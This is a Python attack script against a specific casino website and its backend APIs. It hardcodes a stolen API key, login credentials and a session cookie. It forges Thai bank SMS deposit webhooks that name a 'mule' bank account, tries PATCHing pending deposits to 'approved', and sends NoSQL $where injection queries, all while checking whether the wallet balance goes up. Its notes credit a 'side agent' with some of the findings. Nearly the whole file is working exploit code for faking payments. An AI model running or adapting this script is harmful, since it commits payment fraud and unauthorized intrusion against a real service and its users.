#!/usr/bin/env python3
"""probe_frontend_webhook.py — Test player-facing webhook routes on m.vak88z2.com.

   KEY INSIGHT from side agent: /webhook/* routes on the Nuxt frontend (m.vak88z2.com)
   may proxy to backend with pre-set auth headers, bypassing the PAPDIEAW-KEY check.

   F28 finding showed: Z Seamless /webhook/deposit/sms/kbank on player-facing site.
   Nuxt SSR proxy may add headers like X-Internal: true or JWT from session.

   Also try: direct KBANK webhook with bank_no=2373102108 (from BOLA payment-bank-account).
"""
import base64, json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
CASINO = "https://m.vak88z2.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

PAPDIEAW_KEY = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
# From BOLA /bo/info/payment-bank-account (id 18a9502b) — the KBANK deposit mule
KBANK_MULE_BANK_NO = "2373102108"
FRESH_TX_REF = "016282212408DTF71867"
FRESH_QR     = "0041000600000101030040220016282212408DTF718675102TH91044B59"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}")
print(f"KBANK mule bank_no: {KBANK_MULE_BANK_NO}")
print(f"Fresh tx_ref: {FRESH_TX_REF}\n")

# ── 1. Player-facing webhook routes (Nuxt SSR proxy) ─────────────────────────
print("=== 1. Player-facing /webhook/* routes on m.vak88z2.com ===")

ts = int(time.time() * 1000)
sms_variants = [
    {
        "address": "K-Bank",
        "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
        "bank_no": KBANK_MULE_BANK_NO,
        "timestamp": ts,
    },
    {
        "address": "K-Bank",
        "message": f"KBank: รับโอน 500.00 บาท Ref.{FRESH_TX_REF}",
        "bank_no": KBANK_MULE_BANK_NO,
        "timestamp": ts,
    },
    # Also try with qr_string directly
    {
        "qr_string": FRESH_QR,
        "amount": 500,
        "bank_no": KBANK_MULE_BANK_NO,
        "timestamp": ts,
    },
]

frontend_paths = [
    "/webhook/deposit/sms/kbank",
    "/webhook/deposit/sms/truewallet",
    "/webhook/deposit/sms",
    "/webhook-kbank",
    "/webhook-sms",
    "/webhook/kbank",
    "/webhook/sms",
    "/api/webhook/deposit/sms/kbank",
    "/api/webhook-kbank",
    "/api/webhook-sms",
]

# First: see if any of these paths return something other than SPA HTML
print("  → Probing path existence (GET first):")
for path in frontend_paths:
    r = requests.get(f"{CASINO}{path}", timeout=8,
                     headers={"Accept": "application/json", "Cookie": f"AWSALB={AWSALB}"})
    content_type = r.headers.get("content-type", "")
    if "html" not in content_type.lower() or r.status_code not in (200, 404):
        print(f"  [!!!] GET {path}: HTTP {r.status_code} ({content_type[:30]}): {r.text[:100]}")
    else:
        print(f"  GET {path}: {r.status_code} ({content_type[:20]})")

# Now POST to each path
print("\n  → POSTing to webhook paths:")
for path in frontend_paths[:6]:
    for payload in sms_variants[:2]:
        for headers_variant in [
            # Variant 1: with PAPDIEAW-KEY
            {"Content-Type": "application/json", "PAPDIEAW-KEY": PAPDIEAW_KEY,
             "User-Agent": "okhttp/3.12.1", "Cookie": f"AWSALB={AWSALB}"},
            # Variant 2: with player JWT (Nuxt session)
            {"Content-Type": "application/json", "Authorization": f"Bearer {JWT}",
             "Cookie": f"AWSALB={AWSALB}"},
            # Variant 3: no auth (anonymous)
            {"Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"},
        ]:
            r = requests.post(f"{CASINO}{path}", headers=headers_variant,
                              json=payload, timeout=10)
            content_type = r.headers.get("content-type", "")
            is_html = "html" in content_type.lower()
            auth_label = "PAPDIEAW" if "PAPDIEAW-KEY" in headers_variant else \
                         ("JWT" if "Authorization" in headers_variant else "none")
            if not is_html or r.status_code not in (200, 404):
                print(f"  [!!!] POST {path} [{auth_label}]: HTTP {r.status_code} "
                      f"({content_type[:20]}): {r.text[:150]}")
            time.sleep(0.2)

# ── 2. Try the mgapi webhook with correct bank_no (2373102108) ────────────────
print("\n=== 2. mgapi webhook with confirmed bank_no=2373102108 ===")

wh_payloads = [
    {
        "address": "K-Bank",
        "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
        "timestamp": ts, "bank_no": KBANK_MULE_BANK_NO,
        "sms_id": f"sms-{uuid.uuid4().hex[:8]}", "type": "sms_deposit",
    },
    {
        "address": "KBank",
        "message": f"[K PLUS] โอน/รับ PromptPay: +500.00 บ. {FRESH_TX_REF}",
        "timestamp": ts, "bank_no": KBANK_MULE_BANK_NO,
    },
    # try with account_no instead of bank_no
    {
        "address": "K-Bank",
        "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
        "timestamp": ts, "account_no": KBANK_MULE_BANK_NO,
        "phone_no": "0972571110",
    },
]

for wh_path in ["/webhook-sms", "/webhook-kbank", "/webhook/sms"]:
    for wh_payload in wh_payloads[:2]:
        r = requests.post(f"{MGAPI}{wh_path}",
                          headers={"Content-Type": "application/json",
                                   "PAPDIEAW-KEY": PAPDIEAW_KEY,
                                   "User-Agent": "okhttp/3.12.1"},
                          json=wh_payload, timeout=10)
        print(f"  POST {wh_path} bank_no={KBANK_MULE_BANK_NO}: "
              f"HTTP {r.status_code}: {r.text[:120]}")
        if r.status_code in (200, 201):
            print(f"  [!!!] WEBHOOK SUCCESS!")
            time.sleep(3)
            print(f"  wallet: {wallet()}")
        time.sleep(0.3)

# ── 3. Check deposit transaction history for our pending deposit ──────────────
print("\n=== 3. Check mgapi deposit transaction history ===")
for path in ["/mb/deposit-transaction", "/mb/history-deposit-transaction",
             "/mb/deposit-history"]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR,
                     params={"skip": 0, "limit": 5, "type": "deposit"},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:400]}")
        if r.ok:
            try:
                items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
                for item in items[:3]:
                    print(f"    TX: {item.get('id','?')[:8]} | "
                          f"status={item.get('status','?')} | "
                          f"amount={item.get('amount','?')} | "
                          f"qr={str(item.get('qr_string','?'))[:20]}")
            except Exception:
                pass
    else:
        print(f"  GET {path}: 404")

# ── 4. pbapi: explore deposit-related collections ────────────────────────────
print("\n=== 4. pbapi: find deposit queue + PATCH ===")
pb_hdr = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}

for svc in ["deposit-transactions", "qr-deposits", "transactions", "wallet-transactions"]:
    r = requests.get(f"{PBAPI}/pb/{svc}",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$limit": 5, "$sort[createdAt]": -1},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET /pb/{svc}: HTTP {r.status_code}: {r.text[:300]}")
        if r.ok:
            try:
                items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
                for item in items[:3]:
                    tx_id = item.get("id") or item.get("_id")
                    status = item.get("status") or item.get("deposit_status")
                    print(f"    {str(tx_id)[:8]} | status={status} | "
                          f"amount={item.get('amount', item.get('deposit_amount','?'))}")
                    if tx_id and status != "approved":
                        pr = requests.patch(f"{PBAPI}/pb/{svc}/{tx_id}",
                                            headers=pb_hdr, json={"status": "approved"},
                                            timeout=10)
                        print(f"    PATCH → {pr.status_code}: {pr.text[:100]}")
            except Exception as e:
                print(f"    parse err: {e}")

# ── 5. NoSQL operator injection to force-approve deposit ─────────────────────
print("\n=== 5. NoSQL $push/$set on pbapi to force-approve ===")

# Try the bank-information collection for structured deposit updates
for q in [
    f"this.qr_string=='{FRESH_QR}'",
    f"this.tx_ref=='{FRESH_TX_REF}'",
    "this.status=='pending'&&this.deposit_amount>0",
    "this.deposit_status=='waiting'",
]:
    r = requests.get(f"{PBAPI}/pb/latest-win",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$where": q, "$limit": 5},
                     timeout=10)
    if r.ok:
        try:
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", [])
            if items and str(items) != "[]":
                print(f"  [!!!] [{q[:40]}] {len(items)} records: {str(items[0])[:200]}")
        except Exception:
            pass

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
